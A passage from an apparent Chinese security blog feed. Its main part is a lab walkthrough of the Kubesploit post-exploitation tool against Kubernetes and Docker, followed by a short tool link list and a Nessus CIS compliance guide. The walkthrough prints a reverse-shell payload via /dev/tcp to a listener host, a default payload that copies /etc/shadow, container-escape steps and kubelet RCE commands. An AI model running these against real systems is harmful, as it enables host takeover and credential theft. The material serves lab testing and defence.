alt="1639728261432"></p><ul><li>linux/go/cve2019_5736：检测该容器是否存在CVE-2019-5736容器逃逸漏洞，并实现利用该漏洞，逃逸到宿主机上。</li><li>linux/go/clusterCVEScan：扫描Kubernetes集群中的已知CVE漏洞；</li><li>linux/go/portScan：端口扫描，重点是Kubernetes服务；</li><li>linux/go/serviceScan：从容器内扫描Kubernetes服务；</li><li>linux/go/kubeletAttack：通过该module可以获取所有pods的一些信息：rce，令牌等信息；</li><li>linux/x64/bash/exec/bash:可以在agent中执行任意bash命令。</li><li>linux/go/mountContainerBreakout： 通过将宿主机的磁盘重新挂载到容器中某个目录 实现<strong>容器逃逸</strong>。 </li><li>linux/go/dockerBreakout:  通过容器挂载的 /var/run/docker.sock（宿主机上） 文件实现容器逃逸。</li></ul><h3 id="1-2-2-攻击路线"><a href="#1-2-2-攻击路线" class="headerlink" title="1.2.2 攻击路线"></a>1.2.2 攻击路线</h3><p>了解各个module后，我们知道Kubesploit可以做的东西，下面我们从攻击者攻击路线来看，攻击者如何使用这些module，能达到什么样的攻击效果呢?</p><p>我们知道Kubesploit是一个针对容器化环境的跨平台后渗透利用工具。<strong>使用该工具的前提是攻击者已经渗透到容器中，拿到容器的root权限。</strong></p><p>（1）在容器中部署Kubesploit的agent端，并启动连上server端。进行容器的信息收集，运行步骤（4）。</p><p>（2）<strong>容器是否可逃逸到宿主机上？</strong>该工具有以下三种利用方式：</p><p>​       a.使用linux/go/cve2019_5736的module去探测利用，若利用成功，成功逃逸到宿主机后，</p><p>​       b.使用linux/go/mountContainerBreakout模块去将宿主机的磁盘重新挂载到容器中某个目录，然后使用 计划任务  crontab 写入个反弹shell的恶意代码，使得宿主机执行，则控制住宿主机。</p><p>​       c.使用linux/go/dockerBreakout模块利用 docker.sock 进行容器逃逸。</p><p>如果逃逸成功，拿到宿主机权限，进行（3）（4）（5）。</p><p>（3）使用inux/go/clusterCVEScan模块扫描k8s服务，是否存在已知的CVE漏洞？</p><p>（4）宿主机信息收集：通过使用linux/go/portScan进行端口收集，使用linux/go/serviceScan模块进行服务收集。</p><p>（5）pods探测：通过使用linux/go/kubeletAttack模块，进行pods信息收集：包括是否有RCE漏洞，token等，为进一步渗透到pod做准备。</p><h2 id="1-3-Kubesploit怎么部署"><a href="#1-3-Kubesploit怎么部署" class="headerlink" title="1.3 Kubesploit怎么部署"></a>1.3 Kubesploit怎么部署</h2><p>首先Kubesploit是后渗透利用工具，因此使用该工具的条件是已经拿到容器或者主机的权限，想要进行进一步渗透攻击。因此Kubesploit分为server端和agent端，如下图所示，agent部署在已获得权限的容器或者主机中。server部署在攻击者机器上。攻击者可以通过server来控制所有agent，可以统一进行module攻击。</p><p><img src="/2021/12/17/security-tools-kubesploit/1640079397615.png" alt="1640079397615"></p><h1 id="2-环境准备"><a href="#2-环境准备" class="headerlink" title="2 环境准备"></a>2 环境准备</h1><p>该工具需要GO环境，这里使用1.14版本。非版本可能不兼容。</p><p>使用二进制文件安装【安装】<br>标准官网：<a href="https://golang.org/">https://golang.org/</a> 需要墙<br>镜像官网：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a> 【国内推荐】</p><p>（1）下载文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://dl.google.com/go/go1.14.linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）解压文件到 /usr/local</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxf go1.14.linux-amd64.tar.gz -C /usr/local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在/etc/profile文件末尾添加以下配置，输入 :wq保存</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#golang env config</span><span class="token function">export</span> GO111MODULE<span class="token operator">=</span>on<span class="token function">export</span> GOROOT<span class="token operator">=</span>/usr/local/go <span class="token function">export</span> GOPATH<span class="token operator">=</span>/home/gopath<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$GOROOT</span>/bin:<span class="token variable">$GOPATH</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的GO111MODULE配置是go1.11后出的一种新的包管理go modules方式代替vendor机制，可以不需要GOPATH，项目代码也不一定要放在GOPATH下面 可参考<a href="https://www.cnblogs.com/apocelipes/p/9534885.htm">https://www.cnblogs.com/apocelipes/p/9534885.htm</a><br>GO111MODULE=auto 自动<br>GO111MODULE=on 使用go modules，不会在vendor和gopath找依赖 【推荐新版都用这种】<br>GO111MODULE=off 使用vendor 或者gotpath</p><p>（5）配置文件生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile go version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1639728761904.png" alt="1639728761904"></p><h1 id="3-部署kubesploit"><a href="#3-部署kubesploit" class="headerlink" title="3 部署kubesploit"></a>3 部署kubesploit</h1><p>首先这里使用了3个主机（两个也可），作用如下。因此需要在sec9002上启动agent，sec9003启动server。</p><table><thead><tr><th>hostname</th><th>ip</th><th>作用</th></tr></thead><tbody><tr><td>archery-sec9001</td><td>10.65.103.67</td><td>监听反弹shell（这个也可以在sec9003中监听）</td></tr><tr><td>archery-sec9002</td><td>10.65.103.68</td><td>部署漏洞容器的主机，容器中部署部署kubesploit中的Agent</td></tr><tr><td>archery-sec9003</td><td>10.65.103.69</td><td>部署kubesploit中的server</td></tr></tbody></table><h2 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h2><p>（1）在sec9003上下载kubesploit包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone git://github.com/cyberark/kubesploit.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）进入安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> kubesploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）编译安装：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1639720677749.png" alt="1639720677749"></p><p>（4）快速构建（build） server和agent</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span>:/usr/local/go/bingo build -o agent cmd/merlinagent/main.gogo build -o server cmd/merlinserver/main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到kubesploit文件夹中生成了 agent和server。</p><p><img src="/2021/12/17/security-tools-kubesploit/1639721484176.png" alt="1639721484176"></p><p>（5）上面步骤在sec9002中的容器中做一遍，用来部署agent即可。</p><h2 id="3-2-启动"><a href="#3-2-启动" class="headerlink" title="3.2 启动"></a>3.2 启动</h2><p>（1）sec9003服务器端修改config.yaml，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> config.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1639729283436.png" alt="1639729283436"></p><p>（2）在sec9003服务器端启动服务器端  </p><pre class="line-numbers language-bash"><code class="language-bash">./server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下图可以看到最下面 服务器端开启了监听，因此agent只需要连接下面的地址即可。</p><p><img src="/2021/12/17/security-tools-kubesploit/1639728153682.png" alt="1639728153682"></p><p>（3）在sec9002的容器中启动Agent上连接server</p><pre class="line-numbers language-bash"><code class="language-bash">./agent -url https://10.65.103.69:443 <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）Server上查看agentlist</p><pre class="line-numbers language-bash"><code class="language-bash">agent list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从下图可以看到新的Agent认证检查通过，并且可以看到连接的Agent状态未delayed.</p><p><img src="/2021/12/17/security-tools-kubesploit/1639723863099.png" alt="1639723863099"></p><h1 id="5-攻击"><a href="#5-攻击" class="headerlink" title="5 攻击"></a>5 攻击</h1><p>在Server上可以看到可以利用的模块如下图所示。按Tab可以查看所有的利用模块。所有module使用方法都很简单。以linux/go/portScan为例：</p><p><img src="/2021/12/17/security-tools-kubesploit/1639728261432.png" alt="1639728261432"></p><p>（1）使用module:use module +名字</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/portScan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看module用法</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）设置参数</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» <span class="token keyword">set</span> Urls 10.65.102.52<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）开启扫描</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据1.2.2 攻击路线中提到 拿到一个容器权限后，首先做的是检测是否有漏洞可逃逸到宿主机上。</p><h2 id="5-1-linux-go-cve2019-5736：Docker逃逸漏洞检测"><a href="#5-1-linux-go-cve2019-5736：Docker逃逸漏洞检测" class="headerlink" title="5.1 linux/go/cve2019_5736：Docker逃逸漏洞检测"></a>5.1 linux/go/cve2019_5736：Docker逃逸漏洞检测</h2><p>cve2019_5736是一个Docker逃逸漏洞，关于该漏洞更多请查看XXx。</p><p>漏洞影响范围：Docker版本 &lt; 18.09.2 或者使用 runc版本 &lt;= 1.0-rc6的环境 </p><p>（1）在sec9003主机上使用该模块</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/cve2019_5736<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）将默认的Payload：cat /etc/shadow &gt; /tmp/shadow  &amp;&amp; chmod 777 /tmp/shadow 设置成反弹shell的载荷：</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>CVE-2019-5736<span class="token punctuation">]</span>»set Payload <span class="token comment" spellcheck="true">#!/bin/bash \n bash -i >&amp; /dev/tcp/10.65.103.67/8989 0>&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1640077783963.png" alt="1640077783963"></p><p>（3）运行攻击</p><p><img src="/2021/12/17/security-tools-kubesploit/1640077637015.png" alt="1640077637015"></p><p>（4）可以观察到sec9002中容器agent信息，已经成功覆盖了/bin/sh</p><p><img src="/2021/12/17/security-tools-kubesploit/1640077631012.png" alt="1640077631012"></p><p>（5）sec9001上开启监听：</p><p><img src="/2021/12/17/security-tools-kubesploit/1640078350442.png" alt="1640078350442"></p><p>（6）再sec9002机器中重进入容器：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9002 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it cb957e46368f /bin/sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（7）观察sec9001上的监听，发现反弹Shell成功。说明容器逃逸成功，已经获得sec9002主机权限。</p><p><img src="/2021/12/17/security-tools-kubesploit/1640077755990.png" alt="1640077755990"></p><p><img src="/2021/12/17/security-tools-kubesploit/1640077931065.png" alt="1640077931065"></p><h2 id="5-2-port扫描"><a href="#5-2-port扫描" class="headerlink" title="5.2 port扫描"></a>5.2 port扫描</h2><p>当从容器逃逸到宿主机上后，可以在宿主机上再安装agent去进一步渗透。</p><p>(0)返回主页面</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>CVE-2019-5736<span class="token punctuation">]</span>t»main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(1)使用模块库</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/portScan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)查看模块库使用信息</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1639731335906.png" alt="1639731335906"></p><p>（3）设置扫描目前Url</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» <span class="token keyword">set</span> Urls 10.65.102.52<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）开启扫描</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>PortScan<span class="token punctuation">]</span>» run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:04Z<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning <span class="token keyword">for</span> <span class="token function">open</span> ports <span class="token punctuation">(</span>15 threads<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:07Z<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning IP: 10.65.102.52<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:10Z    8443: kube-apiserver, Kubernetes API port<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:14Z    22: SSH<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:17Z    10256: Kube proxy health check server<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:20Z    80: http<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:23Z    443: https<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:27Z    10250: kubelet HTTPS API <span class="token function">which</span> allows full node access<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:30Z    6443: Kubernetes API port<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:33Z    2379: ETCD server port, kubernetes database<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Results <span class="token keyword">for</span> cac144b6-b177-43b8-bb35-545d4928d0b8 job iDMQzPzTXo at 2021-12-20T07:56:37Z*** DONE ***<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别观察agent和server端输出。</p><p><img src="/2021/12/17/security-tools-kubesploit/1639731800868.png" alt="1639731800868"></p><h2 id="5-3-service扫描"><a href="#5-3-service扫描" class="headerlink" title="5.3 service扫描"></a>5.3 service扫描</h2><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/servicesScankubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>K8sServicesScan<span class="token punctuation">]</span>» <span class="token keyword">set</span> CIDR 10.254.0.0/16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>扫描结果：无返回</p><h2 id="5-4-k8s-CVE扫描"><a href="#5-4-k8s-CVE扫描" class="headerlink" title="5.4 k8s CVE扫描"></a>5.4 k8s CVE扫描</h2><p>在宿主机上可以扫描k8s有没有已知的CVE漏洞。Url为APIserver的地址</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/clusterCVEScankubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>K8sClusterCVEScan<span class="token punctuation">]</span>»infokubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>K8sClusterCVEScan<span class="token punctuation">]</span>»set Url https://10.65.102.52:6443kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>K8sClusterCVEScan<span class="token punctuation">]</span>»run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行后可以发现有下面3个已知CVE漏洞。</p><p><img src="/2021/12/17/security-tools-kubesploit/1639737553250.png" alt="1639737553250"></p><h2 id="5-5-Kubelet-attack"><a href="#5-5-Kubelet-attack" class="headerlink" title="5.5 Kubelet attack"></a>5.5 Kubelet attack</h2><p>还可以使用Kubelet attack进一步去渗透各个pods中。</p><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/kubeletAttackkubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»infokubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Url https://10.65.102.52:10250kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command rcekubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command tokenkubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command run -a <span class="token function">whoami</span>kubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command run -as <span class="token function">whoami</span> -n makebinkubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command run <span class="token function">whoami</span> -n makebinkubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>kubeletctl<span class="token punctuation">]</span>»set Command run <span class="token function">whoami</span> -n kube-system -p haproxy-apaas-master8001 -c haproxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为我们的k8s  访问pod需要token的，因此我们攻击失败。</p><p><img src="/2021/12/17/security-tools-kubesploit/1639990844045.png" alt="1639990844045"></p><h2 id="5-6-moutContainerBreakout"><a href="#5-6-moutContainerBreakout" class="headerlink" title="5.6 moutContainerBreakout"></a>5.6 moutContainerBreakout</h2><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/mountContainerBreakoutkubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>ContainerBreakoutMounting<span class="token punctuation">]</span>»infokubesploit<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span>ContainerBreakoutMounting<span class="token punctuation">]</span>»run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>具体使用功能。通过挂载宿主机磁盘来拿到宿主机权限。</p><p><img src="/2021/12/17/security-tools-kubesploit/1640676266506.png" alt="1640676266506"></p><p><img src="/2021/12/17/security-tools-kubesploit/1639733532127.png" alt="1639733532127"></p><p><img src="/2021/12/17/security-tools-kubesploit/1639991240912.png" alt="1639991240912"></p><h2 id="5-7-use-module-linux-go-var-log-escape"><a href="#5-7-use-module-linux-go-var-log-escape" class="headerlink" title="5.7  use module linux/go/var-log-escape"></a>5.7  use module linux/go/var-log-escape</h2><pre class="line-numbers language-bash"><code class="language-bash">kubesploit» use module linux/go/var-log-escape<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/17/security-tools-kubesploit/1639988119007.png" alt="1639988119007"></p><p><img src="/2021/12/17/security-tools-kubesploit/1639988020351.png" alt="1639988020351"></p><h2 id="5-8-linux-go-dockerBreakout"><a href="#5-8-linux-go-dockerBreakout" class="headerlink" title="5.8 linux/go/dockerBreakout"></a>5.8 linux/go/dockerBreakout</h2><p>使用说明</p><p><img src="/2021/12/17/security-tools-kubesploit/1640676348639.png" alt="1640676348639"></p><h1 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h1><h2 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> GOOS<span class="token operator">=</span>linux<span class="token punctuation">;</span><span class="token function">export</span> GOARCH<span class="token operator">=</span>amd64<span class="token punctuation">;</span>go build -ldflags <span class="token string">"-s -w -X main.build=8707dbcb5ce0ac9e0e10968c8f7ac341ab9ed87f -X github.com/cyberark/kubesploit/pkg/agent.build=8707dbcb5ce0ac9e0e10968c8f7ac341ab9ed87f -X main.protocol=h2 -X main.url=https://127.0.0.1:443 -X main.host= -X main.psk=kubesploit -X main.proxy= -buildid="</span> -o data/temp/v0.1.2/8707dbcb5ce0ac9e0e10968c8f7ac341ab9ed87f/kubesploitServer-Linux-x64 cmd/merlinserver/main.gogo: github.com/CUCyber/ja3transport@v0.0.0-20191126031250-d2ab5557668f: Get https://proxy.golang.org/github.com/%21c%21u%21cyber/ja3transport/@v/v0.0.0-20191126031250-d2ab5557668f.mod: dial tcp 216.58.200.81:443: i/o <span class="token function">timeout</span>make: *** <span class="token punctuation">[</span>server-linux<span class="token punctuation">]</span> Error 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>**solution:**<a href="https://www.jianshu.com/p/b23727397119">https://www.jianshu.com/p/b23727397119</a></p><h2 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h2><pre class="line-numbers language-bash"><code class="language-bash">go: finding github.com/francoispqt/gojay v1.2.13go: finding github.com/golang/protobuf v1.4.2go: finding google.golang.org/protobuf v1.25.0go: finding github.com/marten-seemann/qpack v0.1.0<span class="token comment" spellcheck="true"># github.com/lucas-clemente/quic-go/internal/handshake</span>/home/gopath/pkg/mod/github.com/lucas-clemente/quic-go@v0.17.3/internal/handshake/go_1-13.go:24:75: cannot use c <span class="token punctuation">(</span>type *qtls.ClientHelloInfo<span class="token punctuation">)</span> as <span class="token function">type</span> *tls.ClientHelloInfo <span class="token keyword">in</span> <span class="token keyword">return</span> argumentmake: *** <span class="token punctuation">[</span>server-linux<span class="token punctuation">]</span> Error 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**solution:**go版本号不兼容，使用1.14版本。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/cyberark/kubesploit">https://github.com/cyberark/kubesploit</a>  git地址</p><p><a href="https://www.freebuf.com/articles/container/271402.html">https://www.freebuf.com/articles/container/271402.html</a>  有点子简单介绍</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</category>
      
      
      <comments>https://m01ly.github.io/2021/12/17/security-tools-kubesploit/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>security-tools</title>
      <link>https://m01ly.github.io/2021/12/07/security-tools/</link>
      <guid>https://m01ly.github.io/2021/12/07/security-tools/</guid>
      <pubDate>Tue, 07 Dec 2021 06:50:24 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>威胁建模：</p><p><a href="https://www.bbsmax.com/A/nAJv1w0ozr/">https://www.bbsmax.com/A/nAJv1w0ozr/</a></p><h1 id="CDK-一款针对容器场景的多功能渗透工具"><a href="#CDK-一款针对容器场景的多功能渗透工具" class="headerlink" title="CDK:一款针对容器场景的多功能渗透工具"></a>CDK:一款针对容器场景的多功能渗透工具</h1><p>介绍：<a href="https://paper.seebug.org/1474/">https://paper.seebug.org/1474/</a></p><p>项目地址：<a href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a></p><p>靶场：</p><p> Vulhub  <a href="https://www.freebuf.com/sectool/165062.html">https://www.freebuf.com/sectool/165062.html</a></p><p>SDL:<a href="https://www.freebuf.com/articles/es/220410.html">https://www.freebuf.com/articles/es/220410.html</a></p><p>容器工具：</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/12/07/security-tools/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>nessus扫描合规性</title>
      <link>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/</link>
      <guid>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/</guid>
      <pubDate>Wed, 28 Jul 2021 06:44:50 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-安全扫描"><a href="#1-安全扫描" class="headerlink" title="1 安全扫描"></a>1 安全扫描</h1><p>（1）创建一个高级扫描</p><p><img src="/2021/07/28/scan-nessus-compliance/1627455726030.png" alt="1627455726030"></p><p>（2） 打开 <strong>Plugins</strong>选项.</p><p>Disable 所有插件除了下面几个:</p><ul><li><p>General</p></li><li><p>Settings</p></li><li><p>Policy Compliance</p></li><li><p>Service Detection</p><p>（3） 在Compliance部分 选择 需要扫描的合规系统：centos或者其他.</p></li></ul><p><img src="/2021/07/28/scan-nessus-compliance/1627456193812.png" alt="1627456193812"></p><p>保存扫描即可。</p><h1 id="2-扫描实例-k8s的CIS检测"><a href="#2-扫描实例-k8s的CIS检测" class="headerlink" title="2 扫描实例:k8s的CIS检测"></a>2 扫描实例:k8s的CIS检测</h1><h2 id="2-1-配置"><a href="#2-1-配置" class="headerlink" title="2.1 配置"></a>2.1 配置</h2><p>（1） 在nessus 中导入下列的策略，该策略中包含基础的k8s master的节点cis扫描配置</p><p>（2） 创建Credentials，选择SSH进行配置</p><p>如果supper-user包含了sudo的权限，并可以执行任意的指令，可以直接设置SSH Privilege Escalation 为sudo</p><p>配置的用户需要能登录k8s集群节点的权限</p><p><img src="/2021/07/28/scan-nessus-compliance/1640242433408.png" alt="1640242433408"></p><p>如果supper-user未包含sudo的权限，则可以新建一个用户（需要配置该用户的password）使其可以通过sudo执行任意指令，此时需要设置SSH Privilege Escalation 为su+sudo</p><p><img src="/2021/07/28/scan-nessus-compliance/1640242485565.png" alt="1640242485565"></p><p>关于SSH Privilege Escalation 的解释如下：<a href="https://community.tenable.com/s/article/SSH-Privilege-Escalation#su-sudo">https://community.tenable.com/s/article/SSH-Privilege-Escalation#su-sudo</a></p><p>（3） 在Compliance 中配置CIS 扫描项，需要修改其中的文件路径使其符合集群的情况</p><p><img src="/2021/07/28/scan-nessus-compliance/1640242576609.png" alt="1640242576609"></p><p>（4） 检查Plugins中是否打开了如下的插件</p><p>如果存在问题可以参考:<a href="https://community.tenable.com/s/article/Troubleshoot-failed-audit-compliance-scans">https://community.tenable.com/s/article/Troubleshoot-failed-audit-compliance-scans</a></p><p><img src="/2021/07/28/scan-nessus-compliance/1640242596891.png" alt="1640242596891"></p><h2 id="2-2-运行"><a href="#2-2-运行" class="headerlink" title="2.2 运行"></a>2.2 运行</h2><p>在My Scans→New Scans→ User Defined→ Test_k8s_cis，设置Targets为需要扫描的节点，然后选择Lanch</p><p><img src="/2021/07/28/scan-nessus-compliance/1640242669447.png" alt="1640242669447"></p><h2 id="2-3-查看结果"><a href="#2-3-查看结果" class="headerlink" title="2.3 查看结果"></a>2.3 查看结果</h2><p>运行时间可能较长，运行结束后可以看到compliance中扫描出来的违规配置</p><p><img src="/2021/07/28/scan-nessus-compliance/1640242723451.png" alt="1640242723451"></p><h2 id="2-4-扫描结果分析"><a 